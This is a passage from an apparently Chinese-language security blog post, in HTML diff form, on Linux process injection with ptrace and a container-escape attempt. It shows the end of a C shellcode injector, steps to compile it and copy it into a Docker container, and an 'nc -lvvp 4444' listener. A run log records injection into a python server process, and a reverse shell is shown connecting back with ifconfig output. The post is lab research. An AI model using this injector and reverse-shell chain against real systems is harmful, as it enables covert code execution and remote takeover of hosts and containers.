class="keyword">void</span>*)regs.rip);</span><br><span class="line">  inject_data (target, shellcode, (<span class="keyword">void</span>*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line"></span><br><span class="line">  regs.rip += <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Setting instruction pointer to %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_SETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Run it!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_DETACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(DETACH):&quot;</span>);</span><br><span class="line">	  <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编译代码:</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc infect.<span class="keyword">c</span> -o infect</span><br></pre></td></tr></table></figure>
+
+<p>移动到容器：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp infect test:<span class="regexp">/root/</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击机监听</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+<p>靶机宿主机启动一个python server进程</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> -m SimpleHTTPServer <span class="number">55555</span></span><br></pre></td></tr></table></figure>
+
+<p>查看python server进程:7365</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  poc docker cp infect <span class="built_in">test</span>:/root/</span><br><span class="line">➜  poc docker <span class="built_in">exec</span> -it <span class="built_in">test</span> /bin/bash</span><br><span class="line">root@f147ae171646:/<span class="comment"># ps -ef | grep 5555</span></span><br><span class="line">root      15260   7462  0 11:44 ?        00:00:00 python3 -m http.server 55555</span><br><span class="line">root      15262  15233  0 11:45 pts/1    00:00:00 grep --color=auto 5555</span><br><span class="line">root@f147ae171646:/<span class="comment"># /root/infect 15260</span></span><br><span class="line">+ Tracing process 15260</span><br><span class="line">+ Waiting <span class="keyword">for</span> process...</span><br><span class="line">+ Getting Registers</span><br><span class="line">+ Injecting shell code at 0x7fdb32ef77e4</span><br><span class="line">+ Setting instruction pointer to 0x7fdb32ef77e6</span><br><span class="line">+ Run it!</span><br><span class="line">root@f147ae171646:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p> 结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:37440.</span><br><span class="line">ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.16.42.151  netmask 255.255.255.0  broadcast 172.16.42.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe01:f943  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:01:f9:43  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 206535  bytes 221632693 (211.3 MiB)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>测试动态链接库进行容器逃逸没有成功。可能是不能将容器里的so文件注入到宿主机的进程靶。</p>
+<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>本文先使用动态链接库进行了进程注入，这种方式比较隐蔽，然后使用shellcode注入进程，两者的原理都是通过ptrace来实现的。shellcode的代码是单线程的所以会导致进程阻塞，也许可以加以改造，本人c代码能力有限，暂时不尝试。后续也许会添加用go实现的版本。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2020-01-01/2/">https://payloads.online/archivers/2020-01-01/2/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.52coder.net/post/ld-preload">https://www.52coder.net/post/ld-preload</a></li>
+<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2020-01-01/1/">https://payloads.online/archivers/2020-01-01/1/</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Linux%E5%AE%89%E5%85%A8/" rel="tag"># Linux安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E5%85%A8%E8%A7%A3/" rel="prev" title="web缓存投毒攻击全解">
+      <i class="fa fa-chevron-left"></i> web缓存投毒攻击全解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92%E5%B9%B3%E5%8F%B0-Kubernetes%E5%AE%89%E5%85%A8/" rel="next" title="容器编排平台-Kubernetes安全">
+      容器编排平台-Kubernetes安全 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E8%BF%9B%E8%A1%8C%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">1. 使用动态链接库进行进程注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%B3%A8%E5%85%A5"><span class="nav-text">1.1 动态链接注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85"><span class="nav-text">1.2 进程注入工具安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84poc"><span class="nav-text">1.3 编写一个简单的poc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E6%B5%8B%E8%AF%95%E5%BC%80%E5%90%AFptrace-scope"><span class="nav-text">1.4 测试开启ptrace_scope</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E5%86%99poc"><span class="nav-text">1.5 使用多线程编写poc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-%E4%BD%BF%E7%94%A8socket%E5%A5%97%E6%8E%A5%E5%AD%97%E7%BC%96%E5%86%99poc"><span class="nav-text">1.6 使用socket套接字编写poc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%87shellcode%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B"><span class="nav-text">2. 通过shellcode注入进程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%88%A9%E7%94%A8shellcode%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%BF%9B%E8%A1%8C%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="nav-text">3. 利用shellcode进程注入进行容器逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%80%BB%E7%BB%93"><span class="nav-text">4. 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ShadowFl0w"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">ShadowFl0w</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ShadowFl0w" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ShadowFl0w" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ShadowFl0w</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
